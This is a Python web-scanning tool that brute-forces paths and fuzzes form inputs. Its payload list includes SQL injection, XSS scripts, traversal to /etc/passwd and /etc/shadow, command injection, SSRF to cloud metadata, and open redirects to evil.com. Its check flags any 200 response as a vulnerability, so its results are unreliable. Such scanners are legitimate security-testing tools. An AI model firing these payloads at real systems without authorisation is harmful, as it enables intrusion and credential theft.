import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import json
import os
from colorama import Fore, Style, init
from datetime import datetime
import itertools
import sys
import threading
import time 

init()

# config
MAX_WORKERS = 10
REQUEST_DELAY = 0.1
TIMEOUT = 5

class Spinner:
    def __init__(self):
        self.spinner = itertools.cycle(['-', '/', '|', '\\'])
        self.running = False
        self.thread = None

    def spin(self):
        while self.running:
            sys.stdout.write(next(self.spinner))
            sys.stdout.flush()
            time.sleep(0.1)
            sys.stdout.write('\b')

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self.spin)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
        sys.stdout.write('\b \b')
        sys.stdout.flush()

def get_target_url():
    target_url = input("Enter the target URL (e.g., http://example.com): ").strip()
    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"
    return target_url

def normalize_path(path):
    # pls work now 
    return '/' + path.strip('/')

async def discover_api_endpoints(session, url):
    print(f"Discovering API endpoints on {url}...")
    endpoints = set()

    try:
        async with session.get(url, timeout=TIMEOUT) as response:
            text = await response.text()
            soup = BeautifulSoup(text, "html.parser")

            # Find all links
            for link in soup.find_all("a", href=True):
                href = link["href"]
                full_url = urljoin(url, normalize_path(href))
                endpoints.add(full_url)

            # Find all forms
            for form in soup.find_all("form"):
                action = form.get("action")
                method = form.get("method", "GET").upper()  # Default to GET if method is not specified
                inputs = [input_tag.get("name") for input_tag in form.find_all("input")]

                if action:
                    full_url = urljoin(url, normalize_path(action))
                    endpoints.add((full_url, method, inputs))  # Store form details

            # Find all API endpoints (e.g., Swagger/OpenAPI)
            swagger_url = urljoin(url, "/api-docs/v1/openapi.json")
            swagger_data = await check_swagger_docs(session, swagger_url)
            if swagger_data:
                swagger_endpoints = parse_swagger_docs(swagger_data, url)
                endpoints.update(swagger_endpoints)

    except Exception as e:
        print(f"Error discovering endpoints: {e}")

    return list(endpoints)

def filter_forms(endpoints):
    return [endpoint for endpoint in endpoints if isinstance(endpoint, tuple) and len(endpoint) == 3]

def get_fuzz_payloads(extended_scan=False):
    base_payloads = [
        # SQL Injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        # XSS (Cross-Site Scripting)
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        # Path Traversal
        "../../../../etc/passwd",
        # IDOR (Insecure Direct Object Reference)
        "admin",
        # Command Injection
        "; ls",
        # SSRF (Server-Side Request Forgery)
        "http://localhost",
        # Open Redirect
        "https://evil.com",
        # File Inclusion
        "../../../../etc/passwd%00",
    ]

    if extended_scan:
        extended_payloads = [
            # Additional SQL Injection
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
            # Additional XSS
            "<script>alert(document.domain)</script>",
            "<script>alert(document.origin)</script>",
            '<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>',
            '<script>alert(document.domain.concat("\n").concat(window.origin))</script>',
            "<svg/onload=alert('XSS')>",
            'x" onerror="alert(1)',
            # Additional Path Traversal
            "../../../../etc/shadow",
            "../../../../windows/win.ini",
            # Additional IDOR
            "superuser",
            "root",
            # Additional Command Injection
            "| ls",
            "&& ls",
            # Additional SSRF
            "http://127.0.0.1",
            "http://169.254.169.254",
            # Additional Open Redirect
            "//evil.com",
            # Additional File Inclusion
            "../../../../etc/shadow%00",
        ]
        base_payloads.extend(extended_payloads)

    return base_payloads

async def fuzz_endpoint(session, endpoint, extended_scan=False):
    vulnerabilities = []

    # Skip non-form endpoints
    if not isinstance(endpoint, tuple) or len(endpoint) != 3:
        return vulnerabilities

    url, method, inputs = endpoint

    # Skip the Werkzeug debugger console
    if "console" in url:
        return vulnerabilities

    for payload in get_fuzz_payloads(extended_scan):
        try:
            # Prepare data for POST or GET
            data = {input_name: payload for input_name in inputs} if inputs else {"input": payload}

            # Send request based on form method
            if method == "POST":
                await asyncio.sleep(REQUEST_DELAY)
                async with session.post(url, data=data, timeout=TIMEOUT) as response:
                    text = await response.text()
                    if response.status == 200 and len(text) > 0:
                        vulnerabilities.append(f"Potential vulnerability at {url} with payload: {payload}")
            else:  # Default to GET
                await asyncio.sleep(REQUEST_DELAY)
                async with session.get(url, params=data, timeout=TIMEOUT) as response:
                    text = await response.text()
                    if response.status == 200 and len(text) > 0:
                        vulnerabilities.append(f"Potential vulnerability at {url} with payload: {payload}")

        except Exception as e:
            print(f"Error fuzzing {url}: {e}")

    return vulnerabilities

async def check_swagger_docs(session, url):
    print(f"Checking for Swagger/OpenAPI documentation at {url}...")
    try:
        async with session.get(url, timeout=TIMEOUT) as response:
            content_type = response.headers.get("Content-Type", "").lower()

            # Check if the response is JSON
            if "application/json" in content_type:
                try:
                    swagger_data = await response.json()
                    print("Swagger/OpenAPI documentation found!")
                    return swagger_data
                except json.JSONDecodeError:
                    print("Invalid JSON response. Swagger/OpenAPI documentation not found.")
            else:
                print(f"No Swagger/OpenAPI documentation found (Content-Type: {content_type}).")
    except Exception as e:
        print(f"Error checking Swagger/OpenAPI documentation: {e}")
    return None

def parse_swagger_docs(swagger_data, base_url):
    endpoints = set()
    if "paths" in swagger_data:
        for path, methods in swagger_data["paths"].items():
            normalized_path = normalize_path(path)
            full_url = urljoin(base_url, normalized_path)
            endpoints.add(full_url)
    return list(endpoints)

async def check_path(session, url, path, headers=None):
    full_url = f"{url}/{normalize_path(path)}"

    try:
        await asyncio.sleep(REQUEST_DELAY)
        async with session.get(full_url, headers=headers, timeout=TIMEOUT) as response:
            if response.status == 200:  # Page exists
                return full_url
            elif response.status == 403:  # Forbidden
                return full_url
            elif response.status == 301 or response.status == 302:  # Redirect
                return full_url
    except Exception as e:
        print(f"Error checking {full_url}: {e}")
    return None

async def path_scan(session, url, wordlist, headers=None, recursive=False):
    print(f"Scanning paths on {url}...")
    found_paths = []
    spinner = Spinner()
    spinner.start()

    tasks = [check_path(session, url, path, headers) for path in wordlist]
    results = await asyncio.gather(*tasks)

    for result in results:
        if result:
            found_paths.append(result)
            if recursive:
                sub_wordlist = [os.path.join(result, path) for path in wordlist]
                found_paths.extend(await path_scan(session, url, sub_wordlist, headers, recursive))

    spinner.stop()
    return found_paths

def load_wordlist(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

async def main():
    target_url = get_target_url()

    # Ask the user if they want an extended scan
    extended_scan = input("Do you want to perform an extended scan? (y/n): ").strip().lower() == "y"

    wordlist_file = input("Enter the path to the wordlist file (e.g., wordlist.txt): ").strip()
    if not os.path.isfile(wordlist_file):
        print("Wordlist file not found!")
        return

    wordlist = load_wordlist(wordlist_file)
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    async with aiohttp.ClientSession() as session:
        found_paths = await path_scan(session, target_url, wordlist, headers, recursive=False)

        if found_paths:
            print("\nFound paths:")
            for path in found_paths:
                print(f"- {path}")
        else:
            print("\nNo paths found.")

        endpoints = await discover_api_endpoints(session, target_url)
        endpoints.extend(found_paths)

        # Filter out non-form endpoints
        forms = filter_forms(endpoints)
        print(f"\nFound {len(forms)} forms to fuzz.")

        vulnerabilities = []
        tasks = [fuzz_endpoint(session, form, extended_scan) for form in forms]
        results = await asyncio.gather(*tasks)
        for result in results:
            vulnerabilities.extend(result)

        if vulnerabilities:
            print(f"\n{Fore.MAGENTA}Vulnerabilities Found:{Style.RESET_ALL}")
            for vuln in vulnerabilities:
                print(f"{Fore.MAGENTA}- {vuln}{Style.RESET_ALL}")
        else:
            print("\nNo vulnerabilities found.")

        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        output_file = f"webscan_results_{timestamp}.txt"

        with open(output_file, "w") as f:
            if found_paths:
                f.write("Found paths:\n")
                for path in found_paths:
                    f.write(f"- {path}\n")
            else:
                f.write("No paths found.\n")

            if vulnerabilities:
                f.write("\nVulnerabilities Found:\n")
                for vuln in vulnerabilities:
                    f.write(f"- {vuln}\n")
            else:
                f.write("\nNo vulnerabilities found.\n")

        print(f"\nOutput saved to {output_file}")

if __name__ == "__main__":
    asyncio.run(main())
